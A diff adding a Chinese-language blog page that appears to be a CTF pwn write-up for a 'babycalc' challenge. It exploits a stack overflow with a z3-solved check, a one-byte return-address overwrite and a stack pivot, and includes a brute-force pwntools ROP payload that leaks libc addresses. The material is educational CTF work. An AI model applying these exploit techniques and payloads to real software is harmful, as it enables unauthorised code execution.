@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="babycalc 123456babycalc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;05ede67cc5aa402b2f1ee02f5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移+爆破">
+<meta property="og:url" content="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="babycalc 123456babycalc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;05ede67cc5aa402b2f1ee02f5">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/1675319907757.png">
+<meta property="article:published_time" content="2023-02-05T08:56:43.000Z">
+<meta property="article:modified_time" content="2023-02-05T08:58:57.836Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/1675319907757.png">
+
+<link rel="canonical" href="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>栈迁移+爆破 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          栈迁移+爆破
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-02-05 16:56:43 / Modified: 16:58:57" itemprop="dateCreated datePublished" datetime="2023-02-05T16:56:43+08:00">2023-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>7.1k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>babycalc</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babycalc: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">05</span>ede67cc5aa402b2f1ee02f5e62dd05e80a1f8a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，dynamically，Partial RELRO，NX</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int8 v0; <span class="comment">// al</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int8 v[<span class="number">16</span>]; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line"><span class="keyword">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number-%d:&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">buf[(<span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>;       <span class="comment">// 栈溢出</span></span><br><span class="line">v0 = strtol(buf, <span class="number">0LL</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">v[i] = v0;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>有栈溢出，可以修改<code>i</code></li>
+<li>配合后面的赋值可以修改一字节</li>
+</ul>
+<p><strong>入侵思路</strong></p>
+<p>首先需要绕过一个 check：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v[<span class="number">2</span>] * v[<span class="number">1</span>] * v[<span class="number">0</span>] - v[<span class="number">3</span>] != <span class="number">0x8D56</span></span><br><span class="line">  || v[<span class="number">0</span>] != <span class="number">0x13</span></span><br><span class="line">  || v[<span class="number">2</span>] * <span class="number">0x13</span> * v[<span class="number">1</span>] + v[<span class="number">3</span>] != <span class="number">0x8DE2</span></span><br><span class="line">  || (v[<span class="number">10</span>] + v[<span class="number">0</span>] - v[<span class="number">5</span>]) * v[<span class="number">13</span>] != <span class="number">0x8043</span></span><br><span class="line">  || (v[<span class="number">1</span>] * v[<span class="number">0</span>] - v[<span class="number">2</span>]) * v[<span class="number">3</span>] != <span class="number">0xAC8A</span></span><br><span class="line">  || (v[<span class="number">2</span>] + v[<span class="number">1</span>] * v[<span class="number">0</span>]) * v[<span class="number">3</span>] != <span class="number">0xC986</span></span><br><span class="line">  || v[<span class="number">6</span>] * v[<span class="number">5</span>] * v[<span class="number">4</span>] - v[<span class="number">7</span>] != <span class="number">0xF06D</span></span><br><span class="line">  || v[<span class="number">7</span>] * v[<span class="number">12</span>] + v[<span class="number">1</span>] + v[<span class="number">15</span>] != <span class="number">0x4A5D</span></span><br><span class="line">  || v[<span class="number">6</span>] * v[<span class="number">5</span>] * v[<span class="number">4</span>] + v[<span class="number">7</span>] != <span class="number">0xF1AF</span></span><br><span class="line">  || (v[<span class="number">5</span>] * v[<span class="number">4</span>] - v[<span class="number">6</span>]) * v[<span class="number">7</span>] != <span class="number">0x8E03D</span></span><br><span class="line">  || v[<span class="number">8</span>] != <span class="number">50</span></span><br><span class="line">  || (v[<span class="number">6</span>] + v[<span class="number">5</span>] * v[<span class="number">4</span>]) * v[<span class="number">7</span>] != <span class="number">0x8F59F</span></span><br><span class="line">  || v[<span class="number">10</span>] * v[<span class="number">9</span>] * v[<span class="number">8</span>] - v[<span class="number">11</span>] != <span class="number">0x152FD3</span></span><br><span class="line">  || v[<span class="number">10</span>] * v[<span class="number">9</span>] * v[<span class="number">8</span>] + v[<span class="number">11</span>] != <span class="number">0x15309D</span></span><br><span class="line">  || (v[<span class="number">9</span>] * v[<span class="number">8</span>] - v[<span class="number">10</span>]) * v[<span class="number">11</span>] != <span class="number">0x9C48A</span></span><br><span class="line">  || (v[<span class="number">8</span>] * v[<span class="number">2</span>] - v[<span class="number">13</span>]) * v[<span class="number">9</span>] != <span class="number">0x4E639</span></span><br><span class="line">  || (v[<span class="number">10</span>] + v[<span class="number">9</span>] * v[<span class="number">8</span>]) * v[<span class="number">11</span>] != <span class="number">0xA6BD2</span></span><br><span class="line">  || v[<span class="number">14</span>] * v[<span class="number">13</span>] * v[<span class="number">12</span>] - v[<span class="number">15</span>] != <span class="number">0x8996D</span></span><br><span class="line">  || v[<span class="number">14</span>] * v[<span class="number">13</span>] * v[<span class="number">12</span>] + v[<span class="number">15</span>] != <span class="number">0x89973</span></span><br><span class="line">  || v[<span class="number">11</span>] != <span class="number">101</span></span><br><span class="line">  || (v[<span class="number">13</span>] * v[<span class="number">12</span>] - v[<span class="number">14</span>]) * v[<span class="number">15</span>] != <span class="number">0x112E6</span></span><br><span class="line">  || (v[<span class="number">14</span>] + v[<span class="number">13</span>] * v[<span class="number">12</span>]) * v[<span class="number">15</span>] != <span class="number">0x11376</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接用 z3 求解：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v1,v2,v3,v4 = Ints(<span class="string">&#x27;v1 v2 v3 v4&#x27;</span>)</span><br><span class="line">v5,v6,v7,v8 = Ints(<span class="string">&#x27;v5 v6 v7 v8&#x27;</span>)</span><br><span class="line">v9,v10,v11,v12 = Ints(<span class="string">&#x27;v9 v10 v11 v12&#x27;</span>)</span><br><span class="line">v13,v14,v15,v16 = Ints(<span class="string">&#x27;v13 v14 v15 v16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(v1*v2*v3-v4==<span class="number">0x8D56</span>)</span><br><span class="line">solver.add(v1==<span class="number">0x13</span>)</span><br><span class="line">solver.add(v3*<span class="number">0x13</span>*v2+v4==<span class="number">0x8DE2</span>)</span><br><span class="line">solver.add((v11+v1-v6)*v14==<span class="number">0x8043</span>)</span><br><span class="line">solver.add((v2*v1-v3)*v4==<span class="number">0xAC8A</span>)</span><br><span class="line">solver.add((v3+v2*v1)*v4==<span class="number">0xC986</span>)</span><br><span class="line">solver.add(v7*v6*v5-v8==<span class="number">0xF06D</span>)</span><br><span class="line">solver.add(v8*v13+v2+v16==<span class="number">0x4A5D</span>)</span><br><span class="line">solver.add(v7*v6*v5+v8==<span class="number">0xF1AF</span>)</span><br><span class="line">solver.add((v6*v5-v7)*v8==<span class="number">0x8E03D</span>)</span><br><span class="line">solver.add(v9==<span class="number">50</span>)</span><br><span class="line">solver.add((v7+v6*v5)*v8==<span class="number">0x8F59F</span>)</span><br><span class="line">solver.add(v11*v10*v9-v12==<span class="number">0x152FD3</span>)</span><br><span class="line">solver.add(v11*v10*v9+v12==<span class="number">0x15309D</span>)</span><br><span class="line">solver.add((v10*v9-v11)*v12==<span class="number">0x9C48A</span>)   </span><br><span class="line">solver.add((v9*v3-v14)*v10==<span class="number">0x4E639</span>)</span><br><span class="line">solver.add((v11+v10*v9)*v12==<span class="number">0xA6BD2</span>)    </span><br><span class="line">solver.add(v15*v14*v13-v16==<span class="number">0x8996D</span>)</span><br><span class="line">solver.add(v15*v14*v13+v16==<span class="number">0x89973</span>)</span><br><span class="line">solver.add(v12==<span class="number">101</span>)</span><br><span class="line">solver.add((v14*v13-v15)*v16==<span class="number">0x112E6</span>)</span><br><span class="line">solver.add((v15+v14*v13)*v16==<span class="number">0x11376</span>)        </span><br><span class="line">           </span><br><span class="line"><span class="keyword">if</span> solver.check() == sat: </span><br><span class="line">    ans = solver.model() </span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)  </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[v1 = <span class="number">19</span>,</span><br><span class="line"> v9 = <span class="number">50</span>,</span><br><span class="line"> v12 = <span class="number">101</span>,</span><br><span class="line"> v10 = <span class="number">131</span>,</span><br><span class="line"> v4 = <span class="number">70</span>,</span><br><span class="line"> v3 = <span class="number">53</span>,</span><br><span class="line"> v13 = <span class="number">118</span>,</span><br><span class="line"> v2 = <span class="number">36</span>,</span><br><span class="line"> v16 = <span class="number">3</span>,</span><br><span class="line"> v15 = <span class="number">24</span>,</span><br><span class="line"> v7 = <span class="number">17</span>,</span><br><span class="line"> v8 = <span class="number">161</span>,</span><br><span class="line"> v6 = <span class="number">66</span>,</span><br><span class="line"> v5 = <span class="number">55</span>,</span><br><span class="line"> v11 = <span class="number">212</span>,</span><br><span class="line"> v14 = <span class="number">199</span>]</span><br></pre></td></tr></table></figure>
+<p>入侵思路就是通过一字节修改来伪造返回地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x00000000004007f0</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000000000400c3c</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame inner to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br><span class="line"><span class="function">pwndbg&gt; telescope 0x0000000000400c3c</span></span><br><span class="line"><span class="function">00:0000│  0x400c3c ◂— nop    </span></span><br><span class="line"><span class="function">01:0008│  0x400c44 ◂— mov    r15d, edi</span></span><br><span class="line"><span class="function">02:0010│  0x400c4c ◂— lea    esp, [rip + 0x2011be]</span></span><br><span class="line"><span class="function">03:0018│  0x400c54 ◂— lea    ebp, [rip + 0x2011be]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x0000000000400ba6</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000000000400c18</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame inner to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br><span class="line"><span class="function">pwndbg&gt; telescope 0x0000000000400c18</span></span><br><span class="line"><span class="function">00:0000│  0x400c18 ◂— leave  </span></span><br><span class="line"><span class="function">01:0008│  0x400c20 ◂— add    byte ptr [rax], al</span></span><br><span class="line"><span class="function">02:0010│  0x400c28 ◂— mov    eax, 0</span></span><br><span class="line"><span class="function">03:0018│  0x400c30 ◂— 0xe800000000b8ffff</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>通过覆盖返回地址低位就可以构造出两个 <code>leave ret</code>，然后打栈迁移</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x400bb7</span>    leave  </span><br><span class="line">  <span class="number">0x400bb8</span>    ret    </span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x400c18</span>    leave  </span><br><span class="line">  <span class="number">0x400c19</span>    ret  </span><br></pre></td></tr></table></figure>
+<p>这里的栈迁移比较靠运气，核心点就是利用程序的置空操作：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf[(<span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>; </span><br></pre></td></tr></table></figure>
+<p>利用这一点可以把栈上存储的 RBP 末尾给置空，从而可以把 RSP 迁移到某个末尾为 <code>\x00</code> 的栈地址上，如果这里刚好是 ROP 链就可以劫持程序流（但栈的随机化程度大，恰好命中的可能比较小）</p>
+<p>下面展示一个成功的案例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RBP  <span class="number">0x7ffd50a0aab0</span> —▸ <span class="number">0x7ffd50a0aa00</span> ◂— <span class="number">0x1</span></span><br><span class="line">RSP  <span class="number">0x7ffd50a0a9b0</span> ◂— <span class="number">0x6161616161613432</span> (<span class="string">&#x27;24aaaaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd50a0aa00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd50a0aa00</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd50a0aa08</span> —▸ <span class="number">0x400ca3</span> ◂— pop    rdi</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd50a0aa10</span> —▸ <span class="number">0x602018</span> (<span class="built_in">puts</span>@got.plt) —▸ <span class="number">0x7f1af8eb96a0</span> (<span class="built_in">puts</span>) ◂— push   r12</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd50a0aa18</span> —▸ <span class="number">0x602018</span> (<span class="built_in">puts</span>@got.plt) —▸ <span class="number">0x7f1af8eb96a0</span> (<span class="built_in">puts</span>) ◂— push   r12</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x400c18</span>    leave  </span><br><span class="line">► <span class="number">0x400c19</span>    ret    &lt;<span class="number">0x400ca3</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x400ca3</span>    pop    rdi</span><br><span class="line">  <span class="number">0x400ca4</span>    ret    </span><br></pre></td></tr></table></figure>
+<p>爆破脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        success(<span class="string">&quot;&gt;&gt; testing&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v3 = [<span class="number">19</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">161</span>, <span class="number">50</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">199</span>, <span class="number">24</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ca3</span></span><br><span class="line">puts_got = <span class="number">0x602018</span></span><br><span class="line">puts_plt = <span class="number">0x4005d0</span></span><br><span class="line"></span><br><span class="line">code = p64(<span class="number">1</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+code.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>拿到远程 puts 地址后，可以到如下网站中查看 libc 版本：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts%3A6a0">libc database search (blukat.me)</a> </li>
+</ul>
+<p><img src="/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/1675319907757.png" alt="1675319907757"> </p>
+<ul>
+<li>最后确定 <code>libc6_2.23-0ubuntu11.3_amd64</code></li>
+</ul>
+<p>在 ROP 链的末尾写上程序某个地方的地址，就可以实现循环，常用的地址有3处：</p>
+<ul>
+<li><code>main</code>：主函数</li>
+<li><code>pwn</code>：存在漏洞的函数</li>
+<li><code>start</code>：程序的入口函数</li>
+</ul>
+<p>经过调试发现前两个函数都不适合进行循环，只有在 ROP 链末端写入 <code>start</code> 才有可能 <code>get shell</code>（其实是试出来的）</p>
